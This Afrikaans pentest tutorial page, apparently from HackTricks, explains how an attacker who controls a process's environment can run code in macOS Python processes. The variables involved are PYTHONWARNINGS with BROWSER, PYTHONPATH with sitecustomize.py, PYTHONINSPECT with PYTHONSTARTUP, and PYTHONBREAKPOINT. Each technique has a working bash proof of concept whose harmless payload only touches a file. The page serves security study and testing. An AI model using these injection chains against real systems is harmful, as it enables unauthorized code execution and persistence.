# macOS Python-toepassing-inspuiting

{{#include ../../../banners/hacktricks-training.md}}

## Via die `PYTHONWARNINGS`- en `BROWSER`-omgewingsveranderlikes

As ’n aanvaller ’n Python-proses se omgewing kan beheer, kan die kombinasie van `PYTHONWARNINGS` en `BROWSER` opdraguitvoering veroorsaak wanneer Python die `antigravity`-module invoer terwyl dit ’n vervaardigde waarskuwingsopsie verwerk. Die tegniek maak staat op `antigravity` wat ’n URL met Python se `webbrowser`-module oopmaak, wat die `BROWSER`-omgewingsveranderlike respekteer.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Via `PYTHONPATH` en `sitecustomize.py`

Tydens normale opstart voeg Python se `site`-module werfspesifieke paaie by en probeer dan om ’n module met die naam `sitecustomize` in te voer. Deur ’n aanvaller-leesbare gids eerste op `PYTHONPATH` te plaas, kan ’n aanvaller wat die proses se omgewing beheer, Python ’n payload laat invoer voordat die teikenskrip loop. Die `-S`-vlag deaktiveer outomatiese `site`-inisialisering, terwyl geïsoleerde modus (`-I`) `PYTHONPATH` ignoreer en `-s` en `-E` impliseer.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

Vir persistence deur 'n skryfbare gebruiker-site eerder as 'n geërfde `PYTHONPATH`, sien [Python `.pth`, `.start` en `usercustomize`-opstartlêers](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize).

## Via `PYTHONINSPECT` en `PYTHONSTARTUP` ná 'n script

Op CPython 3.13+ gaan 'n script wat met `PYTHONINSPECT=1` geloods word, in 'n interaktiewe sessie oor wanneer dit klaar is. As standaardinvoer 'n terminale is en PyREPL beskikbaar is, voer daardie sessie die lêer uit waarna `PYTHONSTARTUP` verwys **ná** die teikenscript en voor die prompt. 'n Aanvaller wat albei geërfde veranderlikes en 'n leesbare opstartlêer beheer, kan dus kode in die teikenproses uitvoer sonder om die script daarvan te wysig. Dit is 'n na-script-sneller, nie 'n gewone opstart-hook nie.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

Die ketting voer nie die opstartlêer uit op ouer CPython-weergawes, met standaardinvoer wat nie aan ’n terminaal gekoppel is nie, of wanneer `PYTHON_BASIC_REPL` die basiese REPL afdwing nie. `-E` en `-I` ignoreer die `PYTHON*`-veranderlikes. Gaan die werklike interpreter- en terminaalkonteks na voordat jy op hierdie pad staatmaak.<sup>[[3]](#references)[[5]](#references)</sup>

## Via `PYTHONBREAKPOINT`

Sedert Python 3.7 (PEP 553) voer die ingeboude `breakpoint()` die funksie uit waarna `sys.breakpointhook` wys, en daardie teiken word bepaal deur die **`PYTHONBREAKPOINT`**-omgewingsveranderlike (`package.module.callable`). Die benoemde module word ingevoer en die funksie word uitgevoer voordat die debugger normaalweg sou verskyn. Daarom kan ’n aanvaller wat die omgewing beheer van ’n proses wat `breakpoint()` bereik (iets wat algemeen in instandhoudings-/debug-skripte voorkom en soms in produksiepaaie agterbly), kode uitvoer.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

Anders as `PYTHONWARNINGS`/`PYTHONPATH` vereis dit dat die teiken werklik ’n `breakpoint()`-aanroep bereik, maar dit werk ook uitsluitlik via die **invoer-newe-effekte** van die genoemde module (wys dit na enige invoerbare module — byvoorbeeld een wat eerste op `PYTHONPATH` geplaas is — waarvan die topvlak kode uitvoer). Deur `PYTHONBREAKPOINT=0` in te stel, word die hook heeltemal gedeaktiveer.



## References

- [1] [Inbraak met omgewingsveranderlikes - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Werf-spesifieke konfigurasiehook](https://docs.python.org/3/library/site.html)
- [3] [Python-opdragreël en omgewing](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Ingeboude breakpoint() en PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [CPython-interpreter-REPL-versending (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [CPython PyREPL-opstartlêeruitvoering (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
